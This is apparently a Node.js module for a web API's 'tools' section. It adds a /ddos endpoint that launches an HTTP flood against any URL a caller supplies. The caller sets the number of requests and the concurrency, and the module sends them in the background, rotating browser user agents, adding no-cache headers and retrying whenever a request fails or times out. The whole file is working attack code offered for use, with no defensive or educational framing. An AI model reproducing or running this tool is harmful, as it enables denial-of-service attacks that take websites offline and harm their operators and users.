const http = require('http');
const https = require('https');
const URL = require('url');

module.exports = {
    name: "DDOS Attack",
    desc: "Launch HTTP flood attack on target URL",
    category: "tools",
    method: "GET",
    path: "/ddos",
    params: [
        { name: "target", required: true },
        { name: "requests", required: false },
        { name: "concurrency", required: false }
    ],
    example: "/tools/ddos?target=https://example.com&requests=1000&concurrency=50",
    
    async run(req, res) {
        const target = req.query.target;
        const numRequests = parseInt(req.query.requests) || 10000;
        const concurrency = parseInt(req.query.concurrency) || 200;
        
        if (!target) {
            return res.json({
                status: false,
                message: "Parameter 'target' is required"
            });
        }
        
        try {
            const parsedUrl = URL.parse(target);
            const protocol = parsedUrl.protocol === 'https:' ? https : http;
            
            // Send immediate response
            res.json({
                status: true,
                message: "Attack started",
                target: target,
                requests: numRequests,
                concurrency: concurrency,
                pid: process.pid
            });
            
            // Start attack in background
            setTimeout(() => {
                attackTarget(parsedUrl, protocol, numRequests, concurrency);
            }, 100);
            
        } catch (error) {
            res.json({
                status: false,
                message: "Invalid URL format",
                error: error.message
            });
        }
    }
};

function attackTarget(parsedUrl, protocol, numRequests, concurrency) {
    const userAgents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15'
    ];
    
    let completed = 0;
    const path = parsedUrl.path || '/';
    
    console.log(`[DDOS] Starting attack on ${parsedUrl.hostname}`);
    
    function sendRequest() {
        const options = {
            hostname: parsedUrl.hostname,
            port: parsedUrl.port || (protocol === https ? 443 : 80),
            path: path,
            method: 'GET',
            headers: {
                'User-Agent': userAgents[Math.floor(Math.random() * userAgents.length)],
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Connection': 'keep-alive',
                'Cache-Control': 'no-cache',
                'Pragma': 'no-cache'
            },
            timeout: 30000
        };
        
        const req = protocol.request(options, (res) => {
            res.on('data', () => {});
            res.on('end', () => {
                completed++;
                if (completed < numRequests) {
                    setImmediate(sendRequest);
                } else {
                    console.log(`[DDOS] Attack completed: ${numRequests} requests sent`);
                }
            });
        });
        
        req.on('error', () => {
            setImmediate(sendRequest);
        });
        
        req.on('timeout', () => {
            req.destroy();
            setImmediate(sendRequest);
        });
        
        req.end();
    }
    
    // Start multiple concurrent connections
    for (let i = 0; i < concurrency; i++) {
        setImmediate(sendRequest);
    }
}